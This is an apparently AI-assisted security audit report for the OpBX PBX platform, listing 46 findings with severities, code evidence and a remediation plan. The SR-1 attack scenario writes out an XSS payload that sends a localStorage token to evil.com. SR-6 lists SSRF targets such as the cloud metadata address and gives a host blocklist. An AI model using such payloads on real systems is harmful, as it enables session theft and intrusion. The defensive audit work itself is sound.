# Security Review Results — 2026-04-10

**Reviewer:** OpBX Security Review Team (AI-Assisted)
**Scope:** Full Security Review — All 11 Areas
**Branch/Commit:** develop (c7539d7b)
**Duration:** Comprehensive analysis across all security domains
**Workplan Reference:** `/docs/review-workplan/SECURITY-REVIEW-WORKPLAN.md` v1.0

---

## Executive Summary

This comprehensive security audit of the OpBX PBX platform examined all 11 review areas defined in the security workplan. The codebase demonstrates **strong security foundations** with proper multi-tenant isolation via OrganizationScope, comprehensive webhook signature verification, structured audit logging with PII sanitization, and defense-in-depth with circuit breakers and rate limiting.

However, the audit identified **46 findings** requiring attention. The most critical issues are dependency vulnerabilities (axios SSRF, React Router XSS, AWS SDK injection, Vite path traversal), SSRF risk in user-configured webhook URLs, and missing rate limiting on voice routing endpoints. These should be addressed before the next production deployment.

**Overall Security Rating: B**

**Key Strengths:**
- Multi-tenancy isolation with OrganizationScope and security failsafe
- Role-based access control with 17 policy classes
- Webhook signature verification with timing-safe comparison
- Comprehensive log sanitization (32 sensitive key patterns)
- Security headers (CSP, HSTS in app, X-Frame-Options, Permissions-Policy)
- Encrypted API keys at rest
- Recording upload security pipeline (MIME, extension, binary signature, script detection)

**Key Risks:**
- 9 dependency vulnerabilities across PHP and NPM packages
- SSRF via user-controlled webhook URLs
- Token storage in localStorage vulnerable to XSS
- Missing rate limiting on voice routing endpoints
- Default credentials in Docker configuration

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 9 |
| Medium | 16 |
| Low | 12 |
| Informational | 6 |
| **Total** | **46** |

---

## Area 1: Authentication & Session Security

### [SR-1] Token stored in localStorage — vulnerable to XSS extraction
- **Severity:** High
- **CVSS Score:** 7.1
- **Category:** A07: Authentication Failures
- **CWE:** CWE-522 — Insufficiently Protected Credentials
- **Affected Component(s):** `frontend/src/utils/storage.ts`, `frontend/src/context/AuthContext.tsx`
- **Description:** Authentication tokens are stored in browser localStorage using `opbx_token` key. Any XSS vulnerability in the application allows attackers to steal tokens via `localStorage.getItem('opbx_token')`.
- **Attack Scenario:** An attacker finds an XSS vector (e.g., unsanitized conference room name rendered in UI, or third-party dependency with XSS) and injects `fetch('https://evil.com?t='+localStorage.getItem('opbx_token'))` to steal all active sessions.
- **Evidence:**
  ```typescript
  // frontend/src/utils/storage.ts
  const TOKEN_KEY = 'opbx_token';
  export const storage = {
    getToken(): string | null {
      return localStorage.getItem(TOKEN_KEY);
    },
    setToken(token: string): void {
      localStorage.setItem(TOKEN_KEY, token);
    },
  };
  ```
- **Recommendation:** 
  - **Short-term:** Ensure strict CSP headers prevent inline script execution (mitigates most XSS)
  - **Long-term:** Migrate to httpOnly cookie-based authentication for the SPA, using Laravel Sanctum's cookie guard with CSRF protection
- **Verification:** After migration, confirm `document.cookie` and `localStorage` do not contain tokens accessible to JavaScript.
- **Effort:** L

### [SR-2] No account lockout after failed login attempts
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A07: Authentication Failures
- **CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts
- **Affected Component(s):** `app/Http/Controllers/Api/AuthController.php`
- **Description:** Login is rate-limited to 5 attempts/min per IP via `throttle:auth`, but there is no account-level lockout. An attacker can distribute brute-force attempts across IPs (botnet, proxy rotation) to bypass IP-based rate limiting.
- **Attack Scenario:** Using a botnet with 100 IPs, an attacker makes 500 attempts/minute against a known email address, testing common passwords. The IP-based rate limit is never triggered.
- **Recommendation:** Implement progressive account lockout:
  ```php
  $key = "login_attempts:" . hash('sha256', $email);
  $attempts = Cache::get($key, 0);
  if ($attempts >= 10) {
      return response()->json(['message' => 'Account temporarily locked'], 429);
  }
  Cache::put($key, $attempts + 1, now()->addMinutes(30));
  ```
  Reset on successful login.
- **Verification:** Attempt 11+ failed logins from different IPs — account should lock.
- **Effort:** M

### [SR-3] User enumeration via registration validation endpoint
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A01: Broken Access Control
- **CWE:** CWE-204 — Observable Response Discrepancy
- **Affected Component(s):** `app/Http/Controllers/Api/RegisterController.php`
- **Description:** The `/v1/auth/register/validate` endpoint returns `admin_email_available: true/false`, allowing attackers to enumerate registered email addresses.
- **Attack Scenario:** Attacker scripts requests to validate email list, building a database of registered OpBX users for phishing or credential stuffing.
- **Recommendation:** Return generic responses or add aggressive rate limiting (1 request/10 seconds).
- **Effort:** S

---

## Area 2: Authorization & Access Control

### [SR-4] OrganizationScope bypass without explicit org_id verification
- **Severity:** High
- **CVSS Score:** 8.1
- **Category:** A01: Broken Access Control
- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **Affected Component(s):** Multiple files using `withoutGlobalScope(OrganizationScope::class)`
- **Description:** Several locations use `withoutGlobalScope()` to bypass tenant isolation for lookups. While most include subsequent org_id checks, the pattern of "fetch first, check later" means the full record is loaded into memory before verification. Some locations may have incomplete checks.
- **Attack Scenario:** If any `withoutGlobalScope` usage lacks proper org_id verification, an attacker could access resources from other organizations by guessing or enumerating IDs.
- **Evidence:**
  ```php
  // Pattern found in multiple files:
  $recording = Recording::withoutGlobalScope(OrganizationScope::class)
      ->find($payload['recording_id']);
  // org_id check happens AFTER query
  if ($recording->organization_id !== $expectedOrgId) { ... }
  ```
- **Recommendation:** Audit all `withoutGlobalScope` and `OrganizationScope::bypass()` usages. Prefer inline org_id filtering:
  ```php
  $recording = Recording::withoutGlobalScope(OrganizationScope::class)
      ->where('organization_id', $expectedOrgId)  // Filter BEFORE loading
      ->find($payload['recording_id']);
  ```
- **Verification:** Search codebase for all 27+ `withoutGlobalScope` usages and verify each has org_id filtering.
- **Effort:** M

### [SR-5] Platform manager token revocation incomplete on role change
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** A07: Authentication Failures
- **CWE:** CWE-613 — Insufficient Session Expiration
- **Affected Component(s):** `app/Http/Controllers/Platform/PlatformUserController.php`
- **Description:** When platform manager status is revoked, existing tokens may not be immediately invalidated, allowing continued access until 24-hour expiry.
- **Recommendation:** Revoke all tokens when `is_platform_manager` changes: `$user->tokens()->delete();`
- **Effort:** S

---

## Area 3: Input Validation & Injection

### [SR-6] SSRF risk in call notification webhook URLs
- **Severity:** High
- **CVSS Score:** 8.6
- **Category:** A10: Server-Side Request Forgery
- **CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
- **Affected Component(s):** `app/Http/Controllers/Api/CallNotificationsSettingsController.php`, `app/Services/CallNotifications/WebhookDispatcher.php`
- **Description:** Users can configure webhook URLs for call notifications without server-side validation to prevent access to internal network resources. The WebhookDispatcher makes HTTP POST requests to user-configured URLs.
- **Attack Scenario:** A PBX Admin configures webhook URL as `http://redis:6379/`, `http://mysql:3306/`, or `http://169.254.169.254/latest/meta-data/` (cloud metadata). The dispatcher sends HTTP requests to internal services, potentially exposing configuration data, credentials, or enabling further exploitation.
- **Evidence:** No SSRF protection found in `CallNotificationsSettingsController` or `WebhookDispatcher`.
- **Recommendation:** Add URL validation that blocks:
  - Private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8
  - Link-local: 169.254.0.0/16
  - Loopback: localhost, 0.0.0.0
  - Non-HTTP schemes: file://, ftp://, gopher://
  - Internal Docker hostnames: mysql, redis, minio, app, soketi
  ```php
  private function isInternalUrl(string $url): bool
  {
      $host = parse_url($url, PHP_URL_HOST);
      $ip = gethostbyname($host);
      $blockedHosts = ['localhost', 'mysql', 'redis', 'minio', 'app', 'soketi', 'opbx_app'];
      
      if (in_array($host, $blockedHosts)) return true;
      if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) return true;
      
      return false;
  }
  ```
- **Verification:** Attempt to save internal URLs as webhook targets — all should be rejected.
- **Effort:** M

### [SR-7] CXML builder conference identifier not validated
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A03: Injection
- **CWE:** CWE-20 — Improper Input Validation
- **Affected Component(s):** `app/Services/CxmlBuilder/CxmlBuilder.php`
- **Description:** Conference identifiers are inserted into CXML via `DOMDocument::textContent` (which provides XML encoding), but the identifiers aren't validated for expected format. While DOMDocument prevents XML injection, unexpected characters could cause Cloudonix platform issues.
- **Recommendation:** Add alphanumeric validation: `preg_match('/^[a-zA-Z0-9_-]+$/', $identifier)`.
- **Effort:** S

### [SR-8] CSV injection risk in distribution list export
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** A03: Injection
- **CWE:** CWE-1236 — Improper Neutralization of Formula Elements in a CSV File
- **Affected Component(s):** `app/Http/Controllers/DistributionListController.php` (download method), `app/Http/Controllers/Api/CallDetailRecordController.php` (export method)
- **Description:** CSV exports may not sanitize cell values that begin with `=`, `+`, `-`, `@`, `\t`, `\r`. When opened in Excel, these can execute formulas.
- **Recommendation:** Prefix potentially dangerous cells with a single quote: `if (preg_match('/^[=+\-@\t\r]/', $value)) $value = "'" . $value;`
- **Effort:** S

---

## Area 4: Webhook & API Security

### [SR-9] Missing rate limiting on voice webhook endpoints
- **Severity:** High
- **CVSS Score:** 7.5
- **Category:** A04: Insecure Design
- **CWE:** CWE-770 — Allocation of Resources Without Limits or Throttling
- **Affected Component(s):** `routes/webhooks.php` (voice routes)
- **Description:** Voice routing endpoints (`/voice/route`, `/voice/ivr-input`, `/callbacks/voice/ring-group-callback`, `/callbacks/voice/albs-follow-through`) have `voice.webhook.auth` middleware but no rate limiting. An attacker can flood these endpoints.
- **Attack Scenario:** Attacker sends thousands of requests to `/voice/route` with valid-format but incorrect Bearer tokens. Each request triggers database lookups for organization identification, exhausting connection pool and CPU.
- **Evidence:**
  ```php
  // routes/webhooks.php
  Route::post('/route', [VoiceRoutingController::class, 'handleInbound'])
      ->middleware(['voice.webhook.auth'])  // No rate_limit_org middleware
  ```
- **Recommendation:** Add rate limiting:
  ```php
  ->middleware(['voice.webhook.auth', 'rate_limit_org:voice_routing'])
  ```
  The `rate_limit_org:voice_routing` middleware already exists with 100/min default.
- **Verification:** Send >100 requests/min and verify 429 response.
- **Effort:** S

### [SR-10] Session-update webhook intentionally skips idempotency
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A08: Software and Data Integrity Failures
- **CWE:** CWE-837 — Improper Enforcement of a Single, Unique Action
- **Affected Component(s):** `routes/webhooks.php` (session-update route)
- **Description:** The session-update endpoint intentionally skips `webhook.idempotency` middleware for performance (high-velocity endpoint). While documented in comments, this means duplicate session updates can be processed, potentially causing incorrect call state.
- **Recommendation:** Implement lightweight deduplication using `event_id` with short Redis TTL (60s) rather than full idempotency middleware.
- **Effort:** M

### [SR-11] Health endpoint in webhooks.php exposes service details without auth
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-200 — Exposure of Sensitive Information
- **Affected Component(s):** `routes/webhooks.php` (line 107-116)
- **Description:** The health endpoint returns database name and Redis store type to unauthenticated users, leaking infrastructure details.
- **Evidence:**
  ```php
  'services' => [
      'database' => DB::connection()->getDatabaseName() ? 'connected' : 'disconnected',
      'redis' => Cache::getStore() instanceof \Illuminate\Cache\RedisStore ? 'connected' : 'disconnected',
  ]
  ```
- **Recommendation:** Return only `{status: "ok"}` for public health checks. Move detailed checks behind authentication.
- **Effort:** S

### [SR-12] CDR export endpoint lacks dedicated rate limiting
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A04: Insecure Design
- **CWE:** CWE-770 — Allocation of Resources Without Limits
- **Affected Component(s):** `app/Http/Controllers/Api/CallDetailRecordController.php`
- **Description:** CDR CSV export endpoint uses standard API rate limiting (60/min) but export operations are resource-intensive (database queries, streaming). An attacker could trigger 60 concurrent exports to exhaust resources.
- **Recommendation:** Add dedicated export rate limiting: 5 exports per hour per organization.
- **Effort:** S

---

## Area 5: Data Protection & Privacy

### [SR-13] SIP passwords stored in plaintext
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A02: Cryptographic Failures
- **CWE:** CWE-256 — Unprotected Storage of Credentials
- **Affected Component(s):** `app/Models/Extension.php`, `database/migrations/`
- **Description:** SIP extension passwords are stored in plaintext in the `extensions.password` column. This is a protocol requirement for SIP authentication (SIP digest auth requires the plain password to compute the response), but creates risk if the database is compromised.
- **Recommendation:** **Accepted risk** with compensating controls:
  1. Document as accepted risk in security documentation
  2. Ensure passwords are hidden from serialization (`$hidden` array) — ✅ already done
  3. Add `sensitive-operations` middleware to password retrieval endpoint
  4. Consider database-level encryption (MySQL TDE) for at-rest protection
  5. Generate strong random passwords (32 hex chars) — ✅ already done
- **Effort:** S (documentation), M (if adding TDE)

### [SR-14] Webhook payload phone numbers (PII) in logs
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** A09: Security Logging and Monitoring Failures
- **CWE:** CWE-532 — Insertion of Sensitive Information into Log File
- **Affected Component(s):** `app/Http/Controllers/Webhooks/CloudonixWebhookController.php`
- **Description:** Some webhook log statements include raw phone numbers (caller_id, destination) which constitute PII. LogSanitizer focuses on secrets/credentials but doesn't mask phone numbers.
- **Recommendation:** Add phone number masking to LogSanitizer: `+1234****789` pattern for E.164 numbers.
- **Effort:** S

### [SR-15] CDR raw_cdr JSON stores full Cloudonix payload without sanitization
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A02: Cryptographic Failures
- **CWE:** CWE-312 — Cleartext Storage of Sensitive Information
- **Affected Component(s):** `app/Models/CallDetailRecord.php`
- **Description:** The `raw_cdr` column stores the complete Cloudonix CDR webhook payload as JSON, which may include sensitive metadata. No sanitization is applied before storage.
- **Recommendation:** Review Cloudonix CDR payload for sensitive fields and redact before storage, or document what data is stored.
- **Effort:** S

---

## Area 6: Cryptography

### [SR-16] HMAC signature separator could allow ambiguity
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A02: Cryptographic Failures
- **CWE:** CWE-345 — Insufficient Verification of Data Authenticity
- **Affected Component(s):** `app/Http/Controllers/Api/RecordingsController.php`
- **Description:** Recording HMAC uses `HMAC-SHA256("{path}|{expires}", APP_KEY)`. If `{path}` contains the `|` character, the signature could be forged for different path/expires combinations.
- **Recommendation:** Use a separator that cannot appear in the path (e.g., null byte `\0`) or hash path separately: `HMAC(path) || HMAC(expires)`.
- **Effort:** S

### [SR-17] CDR webhooks accept arbitrarily old timestamps
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A08: Software and Data Integrity
- **CWE:** CWE-345 — Insufficient Verification of Data Authenticity
- **Affected Component(s):** `app/Http/Middleware/EnsureWebhookIdempotency.php`
- **Description:** CDR webhooks are exempted from the 5-minute timestamp freshness check, with no upper age limit. An attacker with a captured CDR webhook could replay it years later.
- **Recommendation:** Add maximum age for CDRs (e.g., 24 hours or 7 days).
- **Effort:** S

---

## Area 7: Infrastructure & Container Security

### [SR-18] Default MinIO credentials in docker-compose.yml
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-798 — Use of Hard-coded Credentials
- **Affected Component(s):** `docker-compose.yml`
- **Description:** MinIO uses `minioadmin/minioadmin` as default credentials. If not changed in production, all stored recordings are accessible.
- **Evidence:**
  ```yaml
  MINIO_ROOT_USER: ${MINIO_ACCESS_KEY:-minioadmin}
  MINIO_ROOT_PASSWORD: ${MINIO_SECRET_KEY:-minioadmin}
  ```
- **Recommendation:** Remove defaults, add validation in entrypoint.
- **Effort:** S

### [SR-19] Dialer worker API token uses weak default
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-798 — Use of Hard-coded Credentials
- **Affected Component(s):** `docker-compose.yml`, `.env.example`
- **Description:** Default token `dev-token-change-in-production` could be used in production if not changed.
- **Recommendation:** Remove default, add startup validation, generate with `openssl rand -hex 32`.
- **Effort:** S

### [SR-20] Redis password may be empty in development
- **Severity:** Medium
- **CVSS Score:** 5.9
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-306 — Missing Authentication for Critical Function
- **Affected Component(s):** `docker-compose.yml`
- **Description:** `REDIS_PASSWORD` may default to empty. If accidentally deployed to production, Redis is unauthenticated.
- **Recommendation:** Enforce Redis password in all environments.
- **Effort:** S

### [SR-21] ngrok service in main docker-compose.yml
- **Severity:** Low
- **CVSS Score:** 3.7
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-200 — Exposure of Sensitive Information
- **Affected Component(s):** `docker-compose.yml`
- **Description:** ngrok tunnel service is in the main compose file, risking accidental production exposure.
- **Recommendation:** Move to `docker-compose.override.yml` or `docker-compose.dev.yml`.
- **Effort:** S

### [SR-22] HSTS header missing from Nginx configuration
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-319 — Cleartext Transmission of Sensitive Information
- **Affected Component(s):** `docker/nginx/conf.d/default.conf`
- **Description:** No HSTS header in Nginx config. While the Laravel SecurityHeaders middleware adds HSTS, Nginx should also set it for static assets and error pages.
- **Recommendation:** Add `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;` to Nginx config.
- **Effort:** S

### [SR-23] Nginx does not set server_tokens off
- **Severity:** Low
- **CVSS Score:** 2.0
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-200 — Information Disclosure
- **Affected Component(s):** `docker/nginx/nginx.conf`
- **Description:** Nginx may expose its version number in response headers and error pages.
- **Recommendation:** Add `server_tokens off;` to nginx.conf.
- **Effort:** S

### [SR-24] Nginx missing client_max_body_size
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A05: Security Misconfiguration
- **CWE:** CWE-770 — Allocation of Resources Without Limits
- **Affected Component(s):** `docker/nginx/conf.d/default.conf`
- **Description:** No `client_max_body_size` directive. Relies solely on PHP upload limits. Large payloads could exhaust Nginx buffers.
- **Recommendation:** Add `client_max_body_size 10M;`.
- **Effort:** S

---

## Area 8: Dependency & Supply Chain Security

### [SR-25] Critical: Axios SSRF vulnerability (NO_PROXY bypass)
- **Severity:** Critical
- **CVSS Score:** 9.1
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-918 — Server-Side Request Forgery
- **Affected Component(s):** `frontend/package.json` (axios)
- **Description:** Axios ≤1.14.0 has a critical SSRF vulnerability (GHSA-3p68-rc4w-qgx5) allowing NO_PROXY hostname normalization bypass.
- **Recommendation:** `cd frontend && npm update axios@latest`
- **Verification:** `npm audit` shows zero critical vulnerabilities.
- **Effort:** S

### [SR-26] Critical: React Router XSS via open redirects
- **Severity:** Critical
- **CVSS Score:** 8.0
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-79 — Cross-site Scripting
- **Affected Component(s):** `frontend/package.json` (react-router-dom, @remix-run/router)
- **Description:** React Router 6.4.0-6.30.2 vulnerable to XSS via open redirects (GHSA-2w69-qvjg-hvjx). Combined with localStorage token storage (SR-1), this could enable token theft.
- **Recommendation:** `cd frontend && npm update react-router-dom@latest`
- **Effort:** S

### [SR-27] Critical: Vite path traversal and arbitrary file read
- **Severity:** Critical
- **CVSS Score:** 7.5
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-22 — Path Traversal
- **Affected Component(s):** `frontend/package.json` (vite)
- **Description:** Vite 7.0.0-7.3.1 has multiple high-severity vulnerabilities including path traversal in `.map` handling, `server.fs.deny` bypass, and arbitrary file read via WebSocket. Development-only but could expose source code and secrets.
- **Recommendation:** `cd frontend && npm update vite@latest`
- **Effort:** S

### [SR-28] High: AWS SDK CloudFront policy document injection
- **Severity:** High
- **CVSS Score:** 8.2
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-74 — Injection
- **Affected Component(s):** `composer.lock` (aws/aws-sdk-php)
- **Description:** AWS SDK 3.11.7-3.371.3 vulnerable to CloudFront policy document injection (GHSA-27qh-8cxx-2cr5).
- **Recommendation:** `composer update aws/aws-sdk-php`
- **Effort:** S

### [SR-29] High: PHPUnit unsafe deserialization
- **Severity:** High
- **CVSS Score:** 8.1
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-502 — Deserialization of Untrusted Data
- **Affected Component(s):** `composer.lock` (phpunit/phpunit — dev dependency)
- **Description:** PHPUnit 9.0.0-12.5.7 vulnerable to unsafe deserialization in PHPT code coverage (CVE-2026-24765). Affects CI/CD pipelines.
- **Recommendation:** `composer update phpunit/phpunit --dev`
- **Effort:** S

### [SR-30] High: libsodium cryptographic vulnerabilities
- **Severity:** High
- **CVSS Score:** 7.5
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-327 — Broken/Risky Cryptographic Algorithm
- **Affected Component(s):** `composer.lock` (paragonie/sodium_compat)
- **Description:** paragonie/sodium_compat <1.24.0 has incomplete input validation (CVE-2025-69277) and missing subgroup check for Edwards25519.
- **Recommendation:** `composer update paragonie/sodium_compat`
- **Effort:** S

### [SR-31] Medium: CommonMark HTML bypass vulnerabilities
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-80 — XSS via HTML
- **Affected Component(s):** `composer.lock` (league/commonmark)
- **Description:** Two vulnerabilities: DisallowedRawHtml bypass via whitespace (CVE-2026-30838) and embed extension allowed_domains bypass (CVE-2026-33347).
- **Recommendation:** `composer update league/commonmark`
- **Effort:** S

### [SR-32] Low: Symfony Process argument escaping on Windows
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-78 — OS Command Injection
- **Affected Component(s):** `composer.lock` (symfony/process)
- **Description:** Incorrect argument escaping under MSYS2/Git Bash on Windows (CVE-2026-24739). Low impact — OpBX runs on Linux/Docker.
- **Recommendation:** `composer update symfony/process`
- **Effort:** S

### [SR-33] Low: PsySH local privilege escalation
- **Severity:** Low
- **CVSS Score:** 3.3
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-426 — Untrusted Search Path
- **Affected Component(s):** `composer.lock` (psy/psysh — dev dependency)
- **Description:** Local privilege escalation via CWD .psysh.php auto-load (CVE-2026-25129). Dev-only.
- **Recommendation:** `composer update psy/psysh --dev`
- **Effort:** S

### [SR-34] Docker images use floating tags
- **Severity:** Low
- **CVSS Score:** 2.0
- **Category:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-1104 — Use of Unmaintained Third Party Components
- **Affected Component(s):** `docker-compose.yml`
- **Description:** MinIO uses `:latest` tag, Soketi uses `:latest-16-alpine`. Floating tags can introduce breaking changes or vulnerabilities without notice.
- **Recommendation:** Pin all Docker images to specific versions.
- **Effort:** S

---

## Area 9: Business Logic Security

### [SR-35] CAC counter race condition in Go worker
- **Severity:** High
- **CVSS Score:** 6.5
- **Category:** A04: Insecure Design
- **CWE:** CWE-362 — Concurrent Execution Using Shared Resource
- **Affected Component(s):** `dialer-worker/internal/limiter/cac.go`
- **Description:** The CAC (Concurrent Active Calls) limiter checks `active < max` then separately increments, creating a TOCTOU race window where multiple goroutines could exceed the CAC limit.
- **Attack Scenario:** During high-volume campaign execution, the race window allows 2-3 extra concurrent calls beyond the configured limit, potentially violating telephony regulations or SLA agreements.
- **Recommendation:** Use Redis Lua script for atomic check-and-increment.
- **Effort:** M

### [SR-36] Campaign lifecycle transitions not locked
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** A04: Insecure Design
- **CWE:** CWE-362 — Race Condition
- **Affected Component(s):** `app/Services/AutoDialer/CampaignLifecycleManager.php`
- **Description:** Campaign state transitions (start, pause, resume, archive) may not use distributed locks, allowing concurrent requests to create inconsistent state.
- **Recommendation:** Add Redis lock for campaign lifecycle transitions.
- **Effort:** S

---

## Area 10: Real-Time & WebSocket Security

### [SR-37] WebSocket channel data includes phone numbers
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Data Protection
- **CWE:** CWE-200 — Information Disclosure
- **Affected Component(s):** `app/Events/CallInitiated.php`
- **Description:** The `CallInitiated` broadcast event includes `from` and `to` phone numbers. Any user subscribed to the organization channel sees all caller IDs.
- **Recommendation:** Consider role-based filtering of broadcast data (Reporter role shouldn't see caller IDs).
- **Effort:** M

### [SR-38] Soketi connection limits not explicitly configured
- **Severity:** Low
- **CVSS Score:** 2.0
- **Category:** A05: Security Misconfiguration
- **Affected Component(s):** `docker-compose.yml` (soketi service)
- **Description:** Soketi WebSocket server relies on default connection limits. Should be explicitly configured to prevent resource exhaustion.
- **Recommendation:** Set explicit `SOKETI_DEFAULT_APP_MAX_CONNS=10000` and per-IP limits.
- **Effort:** S

---

## Area 11: Compliance & Best Practices

### [SR-39] No SECURITY.md for vulnerability reporting
- **Severity:** Low
- **CVSS Score:** N/A
- **Category:** Compliance — Open Source Security
- **Affected Component(s):** Repository root
- **Description:** As an open-source project, OpBX should have a `SECURITY.md` file describing how to report security vulnerabilities responsibly.
- **Recommendation:** Create `SECURITY.md` with reporting instructions, response timeline, and PGP key for encrypted communication.
- **Effort:** S

### [SR-40] Application mode not validated on startup
- **Severity:** Low
- **CVSS Score:** 2.0
- **Category:** A05: Security Misconfiguration
- **Affected Component(s):** `.env.example`, `app/Services/ApplicationConfig.php`
- **Description:** `OPBX_APPLICATION_MODE` accepts arbitrary values without validation. Invalid mode could bypass production security controls.
- **Recommendation:** Validate against `['development', 'production']` on startup.
- **Effort:** S

---

## Informational Notes

### [SR-41] OrganizationScope::bypass() usage count: 105+
- **Category:** Architecture
- **Description:** Extensive use of bypass pattern throughout codebase. While implementation is secure (counter-based, closure-scoped), the volume increases attack surface. Consider architectural changes to reduce bypass needs.

### [SR-42] Token abilities use scoped patterns (not wildcard)
- **Category:** Authentication
- **Description:** AuthController creates tokens with role-scoped abilities (e.g., `extension:*`, `user:read`). This is a positive finding — the prior wildcard concern has been addressed.

### [SR-43] CXML generation uses DOMDocument (secure against injection)
- **Category:** Injection Prevention
- **Description:** CxmlBuilder uses PHP DOMDocument which automatically XML-encodes text content. This effectively prevents CXML injection. Positive finding.

### [SR-44] Recording upload has comprehensive security pipeline
- **Category:** File Upload Security
- **Description:** RecordingUploadService implements 6-layer validation: size, MIME, extension, binary signature, script injection detection, filename sanitization. Strong implementation.

### [SR-45] Distributed locking has DB fallback
- **Category:** Resilience
- **Description:** ResilientCacheService provides DatabaseLockService as fallback when Redis is unavailable. Good defense-in-depth.

### [SR-46] Email domain validation prevents disposable email registration
- **Category:** Anti-abuse
- **Description:** UserCheck.com integration blocks disposable, spam, and role-based email addresses during registration. Positive finding.

---

## OWASP Top 10 Coverage Matrix

| OWASP Category | Status | Findings |
|----------------|--------|----------|
| A01: Broken Access Control | ⚠️ Partial | SR-3, SR-4, SR-5 |
| A02: Cryptographic Failures | ⚠️ Partial | SR-13, SR-15, SR-16 |
| A03: Injection | ✅ Good | SR-7, SR-8 (minor) |
| A04: Insecure Design | ⚠️ Partial | SR-9, SR-12, SR-35, SR-36 |
| A05: Security Misconfiguration | ⚠️ Needs Work | SR-11, SR-18-24, SR-34, SR-38, SR-40 |
| A06: Vulnerable Components | ❌ Critical | SR-25, SR-26, SR-27, SR-28, SR-29, SR-30, SR-31-34 |
| A07: Auth Failures | ⚠️ Partial | SR-1, SR-2 |
| A08: Data Integrity Failures | ⚠️ Partial | SR-10, SR-17 |
| A09: Logging & Monitoring | ✅ Good | SR-14 (minor) |
| A10: SSRF | ❌ High Risk | SR-6, SR-25 |

---

## Remediation Workplan

### Phase 1: Critical — Before Next Deployment (1-2 days)
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-25 | Update axios (SSRF vulnerability) | S | P0 |
| SR-26 | Update react-router-dom (XSS vulnerability) | S | P0 |
| SR-27 | Update Vite (path traversal) | S | P0 |
| SR-28 | Update aws/aws-sdk-php (injection) | S | P0 |
| SR-29 | Update phpunit/phpunit (deserialization) | S | P0 |
| SR-30 | Update paragonie/sodium_compat (crypto) | S | P0 |
| SR-9 | Add rate limiting to voice webhook endpoints | S | P0 |

### Phase 2: High — Within 1 Sprint (1-2 weeks)
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-1 | Evaluate localStorage→httpOnly cookie migration | L | P1 |
| SR-4 | Audit all OrganizationScope bypass usages for org_id filtering | M | P1 |
| SR-6 | Implement SSRF protection for webhook URLs | M | P1 |
| SR-35 | Fix Go CAC counter race condition | M | P1 |
| SR-18 | Remove default MinIO credentials from docker-compose | S | P1 |
| SR-19 | Remove default dialer worker token | S | P1 |

### Phase 3: Medium — Within 1 Month
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-2 | Implement account lockout mechanism | M | P2 |
| SR-3 | Fix user enumeration in registration validation | S | P2 |
| SR-5 | Add token revocation on platform manager role change | S | P2 |
| SR-7 | Add conference identifier validation in CxmlBuilder | S | P2 |
| SR-8 | Add CSV injection protection in exports | S | P2 |
| SR-10 | Add lightweight idempotency for session updates | M | P2 |
| SR-11 | Restrict webhook health endpoint information | S | P2 |
| SR-12 | Add dedicated export rate limiting | S | P2 |
| SR-13 | Document SIP password plaintext as accepted risk | S | P2 |
| SR-14 | Add phone number masking to LogSanitizer | S | P2 |
| SR-20 | Enforce Redis password in all environments | S | P2 |
| SR-22 | Add HSTS to Nginx config | S | P2 |
| SR-36 | Add distributed locks for campaign lifecycle | S | P2 |

### Phase 4: Low/Informational — Backlog
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-15-17 | Data storage and crypto minor items | S each | P3 |
| SR-21, SR-23-24 | Infrastructure hardening | S each | P3 |
| SR-31-34 | Remaining dependency updates | S each | P3 |
| SR-37-40 | WebSocket, compliance, config items | S-M | P3 |
| SR-39 | Create SECURITY.md | S | P3 |

---

## Estimated Total Effort

| Phase | Items | Effort |
|-------|-------|--------|
| Phase 1 (Critical) | 7 | 1-2 days |
| Phase 2 (High) | 6 | 1-2 weeks |
